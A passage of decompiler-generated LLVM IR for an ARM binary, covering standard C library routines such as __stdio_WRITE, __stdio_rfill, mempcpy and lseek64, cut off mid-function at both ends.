  store i32 %v3_17a64, i32* %r0.global-to-local, align 4
  %v1_17a68 = call i32 @__libc_read(i32 %v3_17a64)
  store i32 %v1_17a68, i32* %r0.global-to-local, align 4
  %v5_17a70 = icmp sgt i32 %v1_17a68, 0
  br i1 %v5_17a70, label %.thread7, label %dec_label_pc_17a74

dec_label_pc_17a74:                               ; preds = %bb19
  %v2_17a6c = icmp eq i32 %v1_17a68, 0
  %v0_17a74 = load i32, i32* @r4, align 4
  %v1_17a74 = inttoptr i32 %v0_17a74 to i16*
  %v2_17a74 = load i16, i16* %v1_17a74, align 2
  br i1 %v2_17a6c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_17a74
  %v2_17a78 = or i16 %v2_17a74, 4
  store i16 %v2_17a78, i16* %v1_17a74, align 2
  %v1_17a94.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_17a74
  %v2_17a7c = or i16 %v2_17a74, 8
  store i16 %v2_17a7c, i16* %v1_17a74, align 2
  %v1_17a88 = load i32, i32* @r5, align 4
  store i32 %v1_17a88, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_17a94 = phi i32 [ %v1_17a94.pre, %bb20 ], [ 0, %bb ], [ %v1_17a68, %bb19 ], [ %v1_17a88, %bb21 ]
  %v2_17a90 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17a90, i32* @r4, align 4
  ret i32 %v1_17a94

; uselistorder directives
  uselistorder i16 %v2_17a74, { 1, 0 }
  uselistorder i32 %v1_17a68, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_17b5c2 = icmp eq i32 %arg3, 0
  store i1 %v2_17b5c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17b5c2, label %dec_label_pc_17b64, label %dec_label_pc_17ab4

dec_label_pc_17ab4:                               ; preds = %entry, %dec_label_pc_17b5cthread-pre-split.dec_label_pc_17ab4_crit_edge
  %v0_17ac0 = phi i32 [ %v0_17ac0.pre, %dec_label_pc_17b5cthread-pre-split.dec_label_pc_17ab4_crit_edge ], [ %tmp, %entry ]
  %v0_17abc = phi i32 [ %v5_17acc, %dec_label_pc_17b5cthread-pre-split.dec_label_pc_17ab4_crit_edge ], [ %arg2, %entry ]
  %v3_17ab4 = phi i32 [ %v3_17ab4.pre, %dec_label_pc_17b5cthread-pre-split.dec_label_pc_17ab4_crit_edge ], [ 2147483647, %entry ]
  %v0_17ab8.in = phi i32 [ %v5_17ad0, %dec_label_pc_17b5cthread-pre-split.dec_label_pc_17ab4_crit_edge ], [ %arg3, %entry ]
  %v3_17ab8 = phi i32 [ %v5_17ad0, %dec_label_pc_17b5cthread-pre-split.dec_label_pc_17ab4_crit_edge ], [ %arg3, %entry ]
  %v0_17ab8 = icmp slt i32 %v0_17ab8.in, 0
  %storemerge = select i1 %v0_17ab8, i32 %v3_17ab4, i32 %v3_17ab8
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_17abc, i32* %r1.global-to-local, align 4
  %v1_17ac0 = add i32 %v0_17ac0, 4
  %v2_17ac0 = inttoptr i32 %v1_17ac0 to i32*
  %v3_17ac0 = load i32, i32* %v2_17ac0, align 4
  %tmp21 = inttoptr i32 %v0_17abc to i64*
  %v4_17ac4 = call i32 @__GI___libc_write(i32 %v3_17ac0, i64* %tmp21)
  %v1_17ac8 = icmp slt i32 %v4_17ac4, 0
  %v2_17ac8 = icmp eq i32 %v4_17ac4, 0
  store i1 %v2_17ac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_17ac8, label %dec_label_pc_17ad8, label %dec_label_pc_17b5cthread-pre-split

dec_label_pc_17ad8:                               ; preds = %dec_label_pc_17ab4
  %v0_17ad8 = load i32, i32* @r4, align 4
  %v1_17ad8 = inttoptr i32 %v0_17ad8 to i16*
  %v2_17ad8 = load i16, i16* %v1_17ad8, align 2
  %v1_17adc = or i16 %v2_17ad8, 8
  store i16 %v1_17adc, i16* %v1_17ad8, align 2
  store i32 40788, i32* %r3.global-to-local, align 4
  %v0_17ae8 = call i32 @__aeabi_read_tp()
  %v3_17aec = load i16, i16* @global_var_21a48.352, align 2
  %v4_17aec = sext i16 %v3_17aec to i32
  store i32 %v4_17aec, i32* %r3.global-to-local, align 4
  %v2_17af0 = add i32 %v4_17aec, %v0_17ae8
  %v3_17af0 = inttoptr i32 %v2_17af0 to i32*
  %v4_17af0 = load i32, i32* %v3_17af0, align 4
  store i32 %v4_17af0, i32* %r3.global-to-local, align 4
  %v7_17af4 = icmp eq i32 %v4_17af0, 4
  store i1 %v7_17af4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17af4, label %dec_label_pc_17b00, label %bb22

bb22:                                             ; preds = %dec_label_pc_17ad8
  %v8_17af8 = icmp eq i32 %v4_17af0, 11
  store i1 %v8_17af8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_17af8, label %dec_label_pc_17b00, label %dec_label_pc_17b64

dec_label_pc_17b00:                               ; preds = %dec_label_pc_17ad8, %bb22
  %v0_17b00 = load i32, i32* @r4, align 4
  %v1_17b00 = add i32 %v0_17b00, 8
  store i32 %v1_17b00, i32* %r2.global-to-local, align 4
  %v1_17b04 = inttoptr i32 %v1_17b00 to i32*
  %v2_17b04 = load i32, i32* %v1_17b04, align 4
  store i32 %v2_17b04, i32* %r2.global-to-local, align 4
  %v3_17b04 = add i32 %v0_17b00, 12
  %v4_17b04 = inttoptr i32 %v3_17b04 to i32*
  %v5_17b04 = load i32, i32* %v4_17b04, align 4
  store i32 %v5_17b04, i32* %r3.global-to-local, align 4
  %v2_17b08 = sub i32 %v5_17b04, %v2_17b04
  store i32 %v2_17b08, i32* %r1.global-to-local, align 4
  %v9_17b08 = icmp eq i32 %v5_17b04, %v2_17b04
  store i1 %v9_17b08, i1* %cpsr_z.global-to-local, align 1
  %v0_17b54.pre = load i32, i32* @r5, align 4
  br i1 %v9_17b08, label %dec_label_pc_17b54, label %dec_label_pc_17b10

dec_label_pc_17b10:                               ; preds = %dec_label_pc_17b00
  %v3_17b10 = icmp ult i32 %v2_17b08, %v0_17b54.pre
  %v9_17b10 = icmp eq i32 %v2_17b08, %v0_17b54.pre
  store i1 %v9_17b10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17b10, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_17b10
  store i32 %v0_17b54.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_17b10, %bb23, %dec_label_pc_17b38
  %v2_17b24 = phi i32 [ %v1_17b3c, %dec_label_pc_17b38 ], [ %v2_17b04, %bb23 ], [ %v2_17b04, %dec_label_pc_17b10 ]
  %v0_17b18 = load i32, i32* @r6, align 4
  %v1_17b18 = inttoptr i32 %v0_17b18 to i8*
  %v2_17b18 = load i8, i8* %v1_17b18, align 1
  %v3_17b18 = zext i8 %v2_17b18 to i32
  store i32 %v3_17b18, i32* %r3.global-to-local, align 4
  %v7_17b1c = icmp eq i8 %v2_17b18, 10
  store i1 %v7_17b1c, i1* %cpsr_z.global-to-local, align 1
  %v1_17b20 = add i32 %v0_17b18, 1
  store i32 %v1_17b20, i32* @r6, align 4
  %v3_17b24 = inttoptr i32 %v2_17b24 to i8*
  store i8 %v2_17b18, i8* %v3_17b24, align 1
  %v0_17b28 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17b28, label %dec_label_pc_17b2c, label %dec_label_pc_17b38

dec_label_pc_17b2c:                               ; preds = %.preheader
  %v0_17b2c = load i32, i32* @r4, align 4
  %v1_17b2c = inttoptr i32 %v0_17b2c to i16*
  %v2_17b2c = load i16, i16* %v1_17b2c, align 2
  %v3_17b2c = zext i16 %v2_17b2c to i32
  store i32 %v3_17b2c, i32* %r3.global-to-local, align 4
  %v1_17b30 = and i32 %v3_17b2c, 256
  %v2_17b30 = icmp eq i32 %v1_17b30, 0
  store i1 %v2_17b30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17b30, label %dec_label_pc_17b38, label %dec_label_pc_17b2c.dec_label_pc_17b44_crit_edge

dec_label_pc_17b2c.dec_label_pc_17b44_crit_edge:  ; preds = %dec_label_pc_17b2c
  %v0_17b48.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17b44

dec_label_pc_17b38:                               ; preds = %dec_label_pc_17b2c, %.preheader
  %v0_17b38 = load i32, i32* %r1.global-to-local, align 4
  %v1_17b38 = add i32 %v0_17b38, -1
  store i32 %v1_17b38, i32* %r1.global-to-local, align 4
  %v7_17b38 = icmp eq i32 %v0_17b38, 1
  store i1 %v7_17b38, i1* %cpsr_z.global-to-local, align 1
  %v0_17b3c = load i32, i32* %r2.global-to-local, align 4
  %v1_17b3c = add i32 %v0_17b3c, 1
  store i32 %v1_17b3c, i32* %r2.global-to-local, align 4
  br i1 %v7_17b38, label %dec_label_pc_17b38.dec_label_pc_17b44_crit_edge, label %.preheader

dec_label_pc_17b38.dec_label_pc_17b44_crit_edge:  ; preds = %dec_label_pc_17b38
  %v0_17b44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17b44

dec_label_pc_17b44:                               ; preds = %dec_label_pc_17b2c.dec_label_pc_17b44_crit_edge, %dec_label_pc_17b38.dec_label_pc_17b44_crit_edge
  %v0_17b48 = phi i32 [ %v1_17b3c, %dec_label_pc_17b38.dec_label_pc_17b44_crit_edge ], [ %v0_17b48.pre, %dec_label_pc_17b2c.dec_label_pc_17b44_crit_edge ]
  %v0_17b44 = phi i32 [ %v0_17b44.pre, %dec_label_pc_17b38.dec_label_pc_17b44_crit_edge ], [ %v0_17b2c, %dec_label_pc_17b2c.dec_label_pc_17b44_crit_edge ]
  %v1_17b44 = add i32 %v0_17b44, 8
  %v2_17b44 = inttoptr i32 %v1_17b44 to i32*
  %v3_17b44 = load i32, i32* %v2_17b44, align 4
  store i32 %v3_17b44, i32* %r3.global-to-local, align 4
  %v2_17b48 = add i32 %v0_17b44, 16
  %v3_17b48 = inttoptr i32 %v2_17b48 to i32*
  store i32 %v0_17b48, i32* %v3_17b48, align 4
  %v0_17b4c = load i32, i32* %r3.global-to-local, align 4
  %v1_17b4c = load i32, i32* %r2.global-to-local, align 4
  %v2_17b4c = sub i32 %v1_17b4c, %v0_17b4c
  store i32 %v2_17b4c, i32* %r3.global-to-local, align 4
  %v1_17b50 = load i32, i32* @r5, align 4
  %v2_17b50 = sub i32 %v1_17b50, %v2_17b4c
  br label %dec_label_pc_17b54

dec_label_pc_17b54:                               ; preds = %dec_label_pc_17b00, %dec_label_pc_17b44
  %v0_17b54 = phi i32 [ %v2_17b50, %dec_label_pc_17b44 ], [ %v0_17b54.pre, %dec_label_pc_17b00 ]
  %v1_17b54 = load i32, i32* @r7, align 4
  %v2_17b54 = sub i32 %v1_17b54, %v0_17b54
  store i32 %v2_17b54, i32* @r7, align 4
  br label %dec_label_pc_17b64

dec_label_pc_17b5cthread-pre-split:               ; preds = %dec_label_pc_17ab4
  %v3_17acc = load i32, i32* @r6, align 4
  %v5_17acc = add i32 %v3_17acc, %v4_17ac4
  store i32 %v5_17acc, i32* @r6, align 4
  %v4_17ad0 = load i32, i32* @r5, align 4
  %v5_17ad0 = sub i32 %v4_17ad0, %v4_17ac4
  store i32 %v5_17ad0, i32* @r5, align 4
  %v2_17b5c = icmp eq i32 %v5_17ad0, 0
  store i1 %v2_17b5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17b5c, label %dec_label_pc_17b64, label %dec_label_pc_17b5cthread-pre-split.dec_label_pc_17ab4_crit_edge

dec_label_pc_17b5cthread-pre-split.dec_label_pc_17ab4_crit_edge: ; preds = %dec_label_pc_17b5cthread-pre-split
  %v3_17ab4.pre = load i32, i32* @r8, align 4
  %v0_17ac0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17ab4

dec_label_pc_17b64:                               ; preds = %dec_label_pc_17b5cthread-pre-split, %entry, %bb22, %dec_label_pc_17b54
  %v0_17b64 = load i32, i32* @r7, align 4
  ret i32 %v0_17b64

; uselistorder directives
  uselistorder i32 %v5_17ad0, { 1, 3, 0, 2 }
  uselistorder i32 %v5_17acc, { 1, 0 }
  uselistorder i32 %v0_17b44, { 1, 0 }
  uselistorder i32 %v1_17b3c, { 0, 2, 1 }
  uselistorder i32 %v0_17b38, { 1, 0 }
  uselistorder i32 %v0_17b54.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_17b04, { 1, 0, 2 }
  uselistorder i32 %v2_17b04, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v4_17ac4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17abc, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 11, { 14, 8, 9, 10, 21, 28, 29, 2, 11, 3, 12, 4, 13, 15, 16, 17, 5, 18, 19, 20, 22, 23, 6, 24, 7, 25, 0, 26, 1, 27, 30 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_17b64, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_17b54, { 1, 0 }
  uselistorder label %dec_label_pc_17b44, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17b00, { 1, 0 }
  uselistorder label %dec_label_pc_17ab4, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17b74 = load i32, i32* @r4, align 4
  store i32 %v3_17b74, i32* %stack_var_-8, align 4
  %v1_17b78 = add i32 %arg1, 8
  %v1_17b7c = inttoptr i32 %v1_17b78 to i32*
  %v2_17b7c = load i32, i32* %v1_17b7c, align 4
  store i32 %v2_17b7c, i32* @r1, align 4
  %v3_17b7c = add i32 %arg1, 12
  %v4_17b7c = inttoptr i32 %v3_17b7c to i32*
  %v5_17b7c = load i32, i32* %v4_17b7c, align 4
  %v2_17b80 = sub i32 %v5_17b7c, %v2_17b7c
  store i32 %v2_17b80, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_17b88 = inttoptr i32 %arg1 to i16*
  %v4_17b88 = call i32 @__stdio_READ(i16* %v3_17b88, i32 %v2_17b7c, i32 %v2_17b80)
  %v0_17b8c = load i32, i32* @r4, align 4
  %v1_17b8c = add i32 %v0_17b8c, 8
  %v2_17b8c = inttoptr i32 %v1_17b8c to i32*
  %v3_17b8c = load i32, i32* %v2_17b8c, align 4
  store i32 %v3_17b8c, i32* %r2.global-to-local, align 4
  %v2_17b90 = add i32 %v3_17b8c, %v4_17b88
  %v2_17b94 = add i32 %v0_17b8c, 20
  %v3_17b94 = inttoptr i32 %v2_17b94 to i32*
  store i32 %v2_17b90, i32* %v3_17b94, align 4
  %v0_17b98 = load i32, i32* %r2.global-to-local, align 4
  %v1_17b98 = load i32, i32* @r4, align 4
  %v2_17b98 = add i32 %v1_17b98, 16
  %v3_17b98 = inttoptr i32 %v2_17b98 to i32*
  store i32 %v0_17b98, i32* %v3_17b98, align 4
  %v2_17b9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17b9c, i32* @r4, align 4
  ret i32 %v4_17b88

; uselistorder directives
  uselistorder i32 %v4_17b88, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17ba4 = load i32, i32* @r4, align 4
  store i32 %v3_17ba4, i32* %stack_var_-12, align 4
  %v0_17ba8 = load i32, i32* @r0, align 4
  %v1_17ba8 = inttoptr i32 %v0_17ba8 to i16*
  %v2_17ba8 = load i16, i16* %v1_17ba8, align 2
  %v3_17ba8 = zext i16 %v2_17ba8 to i32
  store i32 %v3_17ba8, i32* %r3.global-to-local, align 4
  %v0_17bac = load i32, i32* @r1, align 4
  %v2_17bac = and i32 %v0_17bac, %v3_17ba8
  %v4_17bac = icmp eq i32 %v2_17bac, 0
  store i32 %v0_17ba8, i32* @r4, align 4
  br i1 %v4_17bac, label %dec_label_pc_17bbc, label %dec_label_pc_17bcc

dec_label_pc_17bbc:                               ; preds = %entry
  %v1_17bbc = and i32 %v3_17ba8, 2176
  %v2_17bbc = icmp eq i32 %v1_17bbc, 0
  br i1 %v2_17bbc, label %dec_label_pc_17bc4, label %dec_label_pc_17bd8

dec_label_pc_17bc4:                               ; preds = %dec_label_pc_17bbc
  %v2_17bc4 = or i32 %v0_17bac, %v3_17ba8
  store i32 %v2_17bc4, i32* %r3.global-to-local, align 4
  %v1_17bc8 = trunc i32 %v2_17bc4 to i16
  store i16 %v1_17bc8, i16* %v1_17ba8, align 2
  %v0_17bcc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17bcc

dec_label_pc_17bcc:                               ; preds = %entry, %dec_label_pc_17bc4
  %v0_17bcc = phi i32 [ %v0_17ba8, %entry ], [ %v0_17bcc.pre, %dec_label_pc_17bc4 ]
  %v1_17bcc = inttoptr i32 %v0_17bcc to i16*
  %v2_17bcc = load i16, i16* %v1_17bcc, align 2
  %v3_17bcc = zext i16 %v2_17bcc to i32
  store i32 %v3_17bcc, i32* %r3.global-to-local, align 4
  %v1_17bd0 = and i32 %v3_17bcc, 16
  store i32 %v1_17bd0, i32* %r5.global-to-local, align 4
  %v2_17bd0 = icmp eq i32 %v1_17bd0, 0
  br i1 %v2_17bd0, label %dec_label_pc_17c00, label %dec_label_pc_17bd8

dec_label_pc_17bd8:                               ; preds = %dec_label_pc_17bbc, %dec_label_pc_17bcc
  store i32 40544, i32* %r3.global-to-local, align 4
  %v0_17bdc = call i32 @__aeabi_read_tp()
  store i32 %v0_17bdc, i32* %r0.global-to-local, align 4
  %v3_17be0 = load i16, i16* @global_var_21a48.352, align 2
  %v4_17be0 = sext i16 %v3_17be0 to i32
  store i32 %v4_17be0, i32* %r3.global-to-local, align 4
  %v3_17be8 = add i32 %v4_17be0, %v0_17bdc
  %v4_17be8 = inttoptr i32 %v3_17be8 to i32*
  store i32 9, i32* %v4_17be8, align 4
  br label %dec_label_pc_17bec

dec_label_pc_17bec:                               ; preds = %dec_label_pc_17c08, %dec_label_pc_17bd8
  %v0_17bec = load i32, i32* @r4, align 4
  %v1_17bec = inttoptr i32 %v0_17bec to i16*
  %v2_17bec = load i16, i16* %v1_17bec, align 2
  %v3_17bec = zext i16 %v2_17bec to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_17bf4 = or i32 %v3_17bec, 8
  store i32 %v1_17bf4, i32* %r3.global-to-local, align 4
  %v1_17bf8 = trunc i32 %v1_17bf4 to i16
  store i16 %v1_17bf8, i16* %v1_17bec, align 2
  %v1_17c40.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c38

dec_label_pc_17c00:                               ; preds = %dec_label_pc_17bcc
  %v1_17c00 = and i32 %v3_17bcc, 64
  %v2_17c00 = icmp eq i32 %v1_17c00, 0
  br i1 %v2_17c00, label %dec_label_pc_17c28, label %dec_label_pc_17c08

dec_label_pc_17c08:                               ; preds = %dec_label_pc_17c00
  %v0_17c08 = load i32, i32* @r0, align 4
  %v1_17c08 = call i32 @__stdio_wcommit(i32 %v0_17c08)
  store i32 %v1_17c08, i32* %r0.global-to-local, align 4
  %v2_17c0c = icmp eq i32 %v1_17c08, 0
  br i1 %v2_17c0c, label %dec_label_pc_17c14, label %dec_label_pc_17bec

dec_label_pc_17c14:                               ; preds = %dec_label_pc_17c08
  %v0_17c14 = load i32, i32* @r4, align 4
  %v1_17c14 = inttoptr i32 %v0_17c14 to i16*
  %v2_17c14 = load i16, i16* %v1_17c14, align 2
  %v3_17c14 = zext i16 %v2_17c14 to i32
  store i32 %v3_17c14, i32* %r3.global-to-local, align 4
  %v1_17c18 = add i32 %v0_17c14, 8
  %v2_17c18 = inttoptr i32 %v1_17c18 to i32*
  %v3_17c18 = load i32, i32* %v2_17c18, align 4
  %v1_17c1c = and i32 %v3_17c14, 65471
  store i32 %v1_17c1c, i32* %r3.global-to-local, align 4
  %v2_17c20 = add i32 %v0_17c14, 28
  %v3_17c20 = inttoptr i32 %v2_17c20 to i32*
  store i32 %v3_17c18, i32* %v3_17c20, align 4
  %v0_17c24 = load i32, i32* %r3.global-to-local, align 4
  %v1_17c24 = trunc i32 %v0_17c24 to i16
  %v2_17c24 = load i32, i32* @r4, align 4
  %v3_17c24 = inttoptr i32 %v2_17c24 to i16*
  store i16 %v1_17c24, i16* %v3_17c24, align 2
  %v0_17c28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17c28

dec_label_pc_17c28:                               ; preds = %dec_label_pc_17c00, %dec_label_pc_17c14
  %v2_17c30 = phi i32 [ %v0_17bcc, %dec_label_pc_17c00 ], [ %v0_17c28.pre, %dec_label_pc_17c14 ]
  %v1_17c28 = inttoptr i32 %v2_17c30 to i16*
  %v2_17c28 = load i16, i16* %v1_17c28, align 2
  %v3_17c28 = zext i16 %v2_17c28 to i32
  %v1_17c2c = or i32 %v3_17c28, 1
  store i32 %v1_17c2c, i32* %r3.global-to-local, align 4
  %v1_17c30 = trunc i32 %v1_17c2c to i16
  store i16 %v1_17c30, i16* %v1_17c28, align 2
  %v0_17c34 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17c34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c38

dec_label_pc_17c38:                               ; preds = %dec_label_pc_17bec, %dec_label_pc_17c28
  %v1_17c40 = phi i32 [ %v1_17c40.pre, %dec_label_pc_17bec ], [ %v0_17c34, %dec_label_pc_17c28 ]
  %v2_17c3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17c3c, i32* @r4, align 4
  ret i32 %v1_17c40

; uselistorder directives
  uselistorder i32 %v3_17ba8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17c38, { 1, 0 }
  uselistorder label %dec_label_pc_17c28, { 1, 0 }
  uselistorder label %dec_label_pc_17bd8, { 1, 0 }
  uselistorder label %dec_label_pc_17bcc, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_17c48 = load i32, i32* @r4, align 4
  %v6_17c48 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_17c58 = call i32 @memcpy()
  %v0_17c5c = load i32, i32* @r5, align 4
  %v1_17c5c = load i32, i32* @r4, align 4
  %v2_17c5c = add i32 %v1_17c5c, %v0_17c5c
  store i32 %v3_17c48, i32* @r4, align 4
  store i32 %v6_17c48, i32* @r5, align 4
  ret i32 %v2_17c5c
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_17c6c = load i32, i32* @r1, align 4
  %v2_17c6c = icmp eq i32 %v0_17c6c, 0
  %v3_17c70 = load i32, i32* @r4, align 4
  store i32 %v3_17c70, i32* %stack_var_-8, align 4
  %v0_17c74 = load i32, i32* @r0, align 4
  store i32 %v0_17c74, i32* %r4.global-to-local, align 4
  br i1 %v2_17c6c, label %dec_label_pc_17c98, label %dec_label_pc_17c7c

dec_label_pc_17c7c:                               ; preds = %entry
  %v1_17c84 = add i32 %v0_17c74, 260
  %v4_17c88 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_17c84)
  %v2_17c8c = icmp eq i32 %v4_17c88, 0
  br i1 %v2_17c8c, label %dec_label_pc_17c9c, label %dec_label_pc_17c98

dec_label_pc_17c98:                               ; preds = %dec_label_pc_17c7c, %entry
  br label %dec_label_pc_17c9c

dec_label_pc_17c9c:                               ; preds = %dec_label_pc_17c7c, %dec_label_pc_17c98
  %storemerge = phi i32 [ 0, %dec_label_pc_17c98 ], [ 1, %dec_label_pc_17c7c ]
  %v1_17ca0 = load i32, i32* %r4.global-to-local, align 4
  %v2_17ca0 = add i32 %v1_17ca0, 256
  %v3_17ca0 = inttoptr i32 %v2_17ca0 to i32*
  store i32 %storemerge, i32* %v3_17ca0, align 4
  %v2_17ca4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17ca4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 9, 0, 5, 6, 1, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 22, 3, 23, 4, 24 }
  uselistorder i32 260, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_17c9c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_17cf4, label %dec_label_pc_17cd8

dec_label_pc_17cd8:                               ; preds = %entry
  %v0_17cdc = call i32 @__aeabi_read_tp()
  %v3_17ce0 = load i16, i16* @global_var_21a48.352, align 2
  %v4_17ce0 = sext i16 %v3_17ce0 to i32
  %v0_17ce4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ce4 = sub i32 0, %v0_17ce4
  store i32 %v1_17ce4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_17cec = add i32 %v4_17ce0, %v0_17cdc
  %v4_17cec = inttoptr i32 %v3_17cec to i32*
  store i32 %v1_17ce4, i32* %v4_17cec, align 4
  %v0_17cfc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17cfc

dec_label_pc_17cf4:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_17cf4 = icmp eq i32 %arg1, 0
  br i1 %v2_17cf4, label %dec_label_pc_17d08, label %dec_label_pc_17cfc

dec_label_pc_17cfc:                               ; preds = %dec_label_pc_17cf4, %dec_label_pc_17cd8
  %v0_17cfc = phi i32 [ %arg1, %dec_label_pc_17cf4 ], [ %v0_17cfc.pre, %dec_label_pc_17cd8 ]
  %v3_17d00 = ashr i32 %v0_17cfc, 31
  br label %dec_label_pc_17d0c

dec_label_pc_17d08:                               ; preds = %dec_label_pc_17cf4
  br label %dec_label_pc_17d0c

dec_label_pc_17d0c:                               ; preds = %dec_label_pc_17cfc, %dec_label_pc_17d08
  %v1_17d14 = phi i32 [ %v0_17cfc, %dec_label_pc_17cfc ], [ %tmp8, %dec_label_pc_17d08 ]
  %storemerge = phi i32 [ %v3_17d00, %dec_label_pc_17cfc ], [ %tmp, %dec_label_pc_17d08 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_17d14

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 6, 4, 5, 7, 8, 0, 1, 2, 3 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_21a48.352, { 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
